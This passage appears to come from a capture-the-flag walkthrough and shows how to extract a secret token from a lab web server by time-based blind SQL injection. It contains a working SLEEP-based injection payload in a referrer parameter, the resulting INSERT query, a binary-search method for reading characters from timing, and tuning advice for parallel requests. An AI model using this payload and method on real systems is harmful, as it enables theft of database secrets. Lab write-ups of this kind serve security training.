Put it all together. The value you want is `beacon_token` in the `secrets` table
(16 lowercase hex characters). Read it one character at a time by asking whether
the ASCII code of that character is at least some number, and letting `SLEEP`
answer:

```
?ref=x',(SELECT IF((ASCII(SUBSTRING((SELECT beacon_token FROM secrets LIMIT 1),1,1))>=97),SLEEP(0.6),0)))-- -
```

which makes the server run, in effect:

```sql
INSERT INTO hits (referrer, ua)
VALUES ('x',(SELECT IF((ASCII(SUBSTRING((SELECT beacon_token FROM secrets LIMIT 1),1,1))>=97),SLEEP(0.6),0)))-- -', '<ua>')
```

- `SUBSTRING(...,1,1)` picks position 1 (change the `1` to walk positions 1..16).
- `ASCII(...) >= 97` asks "is this char >= 'a'?" — if yes, the request sleeps
  ~0.6s; if no, it returns instantly. Treat anything slower than ~0.4s as "yes".
- **Binary-search** each position over the charset `0123456789abcdef`: it is
  already sorted by ASCII, so ~4 questions pin down each character. Sixteen
  positions × ~4 questions ≈ 64 requests total.

Speed it up by extracting several positions **in parallel** — but cap your
concurrency at the number of server workers (4 here). If you fire more concurrent
requests than the server can run at once, a "fast" (false) request can get stuck
in line behind another request's `SLEEP` and _look_ slow, corrupting your
readings. Match the two, re-measure anything borderline, and the signal stays
clean.

Assemble the 16 characters and claim the flag:

```
POST /solve   {"token":"<the 16-hex token>"}
```

A correct token returns the flag; a wrong one returns 403. The token is random
per instance, so extract the one _your_ container is holding.
